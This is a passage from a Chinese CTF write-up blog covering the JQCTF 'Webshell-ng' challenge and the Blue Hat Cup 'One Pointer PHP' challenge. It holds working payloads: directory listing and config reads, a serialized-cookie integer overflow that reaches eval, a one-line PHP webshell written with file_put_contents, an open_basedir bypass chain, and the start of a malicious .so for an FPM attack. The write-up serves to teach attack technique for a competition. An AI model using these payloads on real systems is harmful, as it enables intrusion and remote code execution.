class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;sqlite3&quot;</span></span><br><span class="line">  [<span class="number">6</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;zlib&quot;</span></span><br><span class="line">  [<span class="number">7</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;ctype&quot;</span></span><br><span class="line">  [<span class="number">8</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;curl&quot;</span></span><br><span class="line">  [<span class="number">9</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dom&quot;</span></span><br><span class="line">  [<span class="number">10</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;fileinfo&quot;</span></span><br><span class="line">  [<span class="number">11</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;filter&quot;</span></span><br><span class="line">  [<span class="number">12</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [<span class="number">13</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;hash&quot;</span></span><br><span class="line">  [<span class="number">14</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;iconv&quot;</span></span><br><span class="line">  [<span class="number">15</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;json&quot;</span></span><br><span class="line">  [<span class="number">16</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;mbstring&quot;</span></span><br><span class="line">  [<span class="number">17</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;SPL&quot;</span></span><br><span class="line">  [<span class="number">18</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;session&quot;</span></span><br><span class="line">  [<span class="number">19</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;PDO&quot;</span></span><br><span class="line">  [<span class="number">20</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;pdo_sqlite&quot;</span></span><br><span class="line">  [<span class="number">21</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;standard&quot;</span></span><br><span class="line">  [<span class="number">22</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;posix&quot;</span></span><br><span class="line">  [<span class="number">23</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;random&quot;</span></span><br><span class="line">  [<span class="number">24</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;readline&quot;</span></span><br><span class="line">  [<span class="number">25</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;Reflection&quot;</span></span><br><span class="line">  [<span class="number">26</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;Phar&quot;</span></span><br><span class="line">  [<span class="number">27</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;SimpleXML&quot;</span></span><br><span class="line">  [<span class="number">28</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;tokenizer&quot;</span></span><br><span class="line">  [<span class="number">29</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;xml&quot;</span></span><br><span class="line">  [<span class="number">30</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlreader&quot;</span></span><br><span class="line">  [<span class="number">31</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlwriter&quot;</span></span><br><span class="line">  [<span class="number">32</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;mysqlnd&quot;</span></span><br><span class="line">  [<span class="number">33</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;cgi-fcgi&quot;</span></span><br><span class="line">  [<span class="number">34</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;mysqli&quot;</span></span><br><span class="line">  [<span class="number">35</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;pdo_mysql&quot;</span></span><br><span class="line">  [<span class="number">36</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;sodium&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，有 mysqli,</p><h2 id="扫目录"><span id="扫目录"> 扫目录</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=<span class="keyword">new</span>&amp;<span class="number">1</span>=<span class="built_in">DirectoryIterator</span>&amp;<span class="number">2</span>=path&amp;<span class="number">3</span>=file&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=print_r&amp;<span class="number">6</span>=file&amp;path=glob:<span class="comment">///var/www/html/d*&amp;pc=0</span></span><br></pre></td></tr></table></figure><p>发现 config.php, 读一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=highlight_file&amp;<span class="number">2</span>=file&amp;file=config.php&amp;b&amp;pc=<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701653156207(1).png" alt="1701653156207(1)"></p><p>发现数据库密码，那么目前就有一个思路，通过连接数据库进行一些操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$DB_NAME</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_USER</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_PASSWORD</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_HOST</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="连接-mysql"><span id="连接-mysql"> 连接 mysql</span></h1><p>扩展里面有 mysqli 这个类，那么可以通过 mysqli 去连接数据库.</p><p>不过在此之前还要解决的一个问题就是：创建一个对象的实例，题目只能创建一个单参数的构造函数对象，而 mysqli 的连接，起码要三个参数.</p><p>怎么办呢？👴想到了用反射，反射的构造函数只有一个参数，并且，反射创建实例，支持使用数组传递所有参数，这就完美地契合我们的需求.</p><p>因此思路就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;mysqli&#x27;</span>);</span><br><span class="line"><span class="variable">$args</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;web&#x27;</span>]</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>(<span class="variable">$args</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br></pre></td></tr></table></figure><p>可以执行 sql 语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionClass mysqli refClass</span></span><br><span class="line"><span class="string">    ICALL refClass newInstanceArgs mysqli_arg mysqli1</span></span><br><span class="line"><span class="string">    ICALL mysqli1 query query_arg result</span></span><br><span class="line"><span class="string">    ICALL result fetch_all res row</span></span><br><span class="line"><span class="string">    CALL var_dump row _</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>我这里用的反射创建 mysqli, 用反射调用 connect 方法也行</p><p>读取数据库，拿到一半的 flag.</p><h1 id="自动化脚本"><span id="自动化脚本"> 自动化脚本</span></h1><p>出题人说，脑算逻辑很累，所以他整了个脚本，但是这个脚本比较复杂，所以我带着你们来品鉴一下.</p><p>脚本用了一堆我看不懂的语法，慢慢啃一下.</p><h2 id="主逻辑"><span id="主逻辑"> 主逻辑</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">run</span>(<span class="attr">func</span>: <span class="keyword">callable</span>):</span><br></pre></td></tr></table></figure><p>函数的定义就整了波大的，搜了一下才知道将回调函数作为参数传入 run 函数。懂了懂了😊😊😊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code, data = func()</span><br><span class="line">code = code.replace(<span class="string">&quot;\n\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">code = code.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">code = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&quot; &quot;</span>), code)</span><br><span class="line">code = itertools.chain.from_iterable(code)</span><br><span class="line">code = <span class="built_in">map</span>(name_convert, code)</span><br><span class="line">code = <span class="built_in">list</span>(code)</span><br><span class="line">code = &#123;k: code[k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code))&#125;</span><br><span class="line">data = data_convert(data)</span><br><span class="line">code = code | data</span><br><span class="line">res = requests.post(URL, data=code)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>然后就有了这么一些东西，code data 的值暂且先放一下不分析.</p><p>主要看看 map, 相当于写了个一个简洁的循环，我们都知道， <code>lambda</code>  一般都表示匿名函数，用在 map 里面，可以写一些简单的操作逻辑.</p><p>执行以后会返回 map,itertools.chain.from_iterable <code>是 Python 标准库中</code>  itertools` 模块提供的一个函数，用于将多个可迭代对象连接成一个单一的迭代器.</p><p>然后又用了一次 map, 进行 name_convert 操作，这里主要就是进行一些名词替换.</p><p>list 就是将迭代器转换成列表.</p><p>然后转换成对象，和题目的数字对应.</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701656438693.png" alt="1701656438693"></p><p>这样大体上的功能就实现了，接下来就是传入参数了.</p><h2 id="参数处理"><span id="参数处理"> 参数处理</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = data_convert(data)</span><br></pre></td></tr></table></figure><p>data 就是一些具体函数的参数的实现</p><p>看看 data_convert 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_convert</span>(<span class="params">data: <span class="built_in">dict</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">            <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">        l.append(data_item(k, data[k]))</span><br><span class="line">    l = flatten(l)</span><br><span class="line">    <span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> l&#125;</span><br></pre></td></tr></table></figure><p>主要看 <code>data_item</code> , 这里会遍历字典 data, 并把 key 和 value 传入 <code>data_item</code> .</p><p>重点是看一下对列表的处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_item</span>(<span class="params">key: <span class="built_in">str</span>, value: <span class="built_in">int</span> | <span class="built_in">str</span> | <span class="built_in">dict</span> | <span class="built_in">list</span></span>):</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">type</span>(value) == <span class="built_in">int</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">str</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">bytes</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">dict</span>:</span><br><span class="line">           new = []</span><br><span class="line">           <span class="keyword">for</span> k <span class="keyword">in</span> value:</span><br><span class="line">               new.append(data_item(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>[<span class="subst">&#123;k&#125;</span>]&quot;</span>, value[k]))</span><br><span class="line">           <span class="keyword">return</span> new</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">list</span>:</span><br><span class="line">           new = []</span><br><span class="line">           <span class="keyword">if</span> <span class="built_in">len</span>(value) == <span class="number">0</span>:</span><br><span class="line">               new.append((<span class="string">&quot;array[]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(value)):</span><br><span class="line">                   new.append(data_item(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>[<span class="subst">&#123;k&#125;</span>]&quot;</span>, value[k]))</span><br><span class="line">           <span class="keyword">return</span> new</span><br><span class="line">       <span class="keyword">raise</span> Exception(<span class="string">&quot;unsupported type&quot;</span>)</span><br></pre></td></tr></table></figure><p>前面的类型无关紧要。当传入列表的时候，会再次递归调用 data_item,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;mysqli_arg&quot;</span>: [<span class="string">&quot;127.0.0.1:3306&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>],</span><br></pre></td></tr></table></figure><p>该列表会按照索引，一个个转变成 <code>mysqli_arg[k]:value</code></p><p>这样子就巧妙地实现了 php 中数组的传参，从而完成一些需要数组作为参数的函数的调用.</p><h2 id="yield"><span id="yield"> yield</span></h2><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701657489001.png" alt="1701657489001"></p><p>然后还需要 <code>flatten</code>  处理，因为 <code>data_item</code>  返回的是一个又一个列表嵌套着元组的键值对，</p><p><code>yield</code>  是 Python 中用于定义生成器函数的关键字。生成器函数是一种特殊的函数，其执行过程可以在每次调用时被挂起，并且在下一次调用时从挂起的位置继续执行。这允许你按需生成一系列值，而不必一次性生成所有值，从而在处理大量数据时节省内存。</p><p>👴不喜欢废话，👴简单说一下有啥意思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">        <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">yield</span> something</span><br></pre></td></tr></table></figure><p>经过 yield 处理后生成一个对象，该对象在每次迭代的时候，返回值从 yield 出现的次序依次返回.</p><p>比如说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)], [[(<span class="string">&#x27;mysqli_arg[0]&#x27;</span>, <span class="string">&#x27;127.0.0.1:3306&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[1]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[2]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[3]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)]], [(<span class="string">&#x27;query_arg&#x27;</span>, <span class="string">&#x27;show tables&#x27;</span>)]]</span><br></pre></td></tr></table></figure><p>首先选取第一个列表，进入 if</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)]</span><br></pre></td></tr></table></figure><p>然后通过 yield 再次进入 flatten,</p><p>然后继续遍历该列表此时只有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不满足 if 条件，直接进入 yield, 进行返回，同时记录下第一个 yield.</p><p>后面在进行迭代的时候，第一次就会返回这个 yield.</p><p>于是就能够将所有嵌套的列表全部去掉，展成一维的内容.</p><p>小 demo 如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">        <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">ls = [[<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,[<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;c&quot;</span>]],<span class="string">&#x27;ice&#x27;</span>,[<span class="string">&quot;shanghe&quot;</span>],[<span class="string">&#x27;k0reyosh1&#x27;</span>,[<span class="string">&quot;caaaaa&quot;</span>,[<span class="string">&quot;mylife&quot;</span>,<span class="string">&quot;1llustrious&quot;</span>]]]]</span><br><span class="line"></span><br><span class="line">ls1 = flatten(ls)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701659717709.png" alt="1701659717709"></p><p>可以看到就将嵌套的所有列表去除掉，输出里面的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> l&#125;</span><br></pre></td></tr></table></figure><p>最后输入元组的前两个内容，整成一个键值对字典</p><p>后面合并字典，发送请求.</p><h1 id="首先来看看非常抽象的一道懒猫杯"><span id="首先来看看非常抽象的一道懒猫杯"> 首先来看看非常抽象的一道懒猫杯</span></h1><p>蓝帽杯 One Pointer PHP</p><h2 id="源码鉴赏一波"><span id="源码鉴赏一波"> 源码鉴赏一波</span></h2><p>add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里如果要进 eval, 就不能让 <code>$count</code>  中的元素为 1, 对此绕过的方法是数组溢出.</p><p>32 位上为 <code>2147483647</code> ，64 位上为 <code>9223372036854775807</code> ，所以这里我们应该设置 count 为 <code>9223372036854775806</code></p><p>所以直接构造序列化，打进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;count = <span class="number">9223372036854775806</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用 phpinfo, 发现</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/image-20231208142228538.png" alt="image-20231208142228538"></p><p>使用 file_put_contents 写个 shell 进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="绕过-openbase_dir"><span id="绕过-openbase_dir"> 绕过 openbase_dir</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现在根目录有 flag, 但是没权限读.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">backdoor=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/usr/local/etc/php/php.ini&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取 php.ini 的设置<br>！[屏幕截图 2023-12-08 143512](./JQCTF-Webshell-ng/ 屏幕截图 2023-12-08 143512.png)</p><p>加载了 so 文件.</p><p>所以选择打一个远程 fpm</p><h2 id="首先准备一个恶意的-so"><span id="首先准备一个恶意的-so"> 首先准备一个恶意的 so</span></h2><p>脚本穿三代，人走它还在.🤣</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 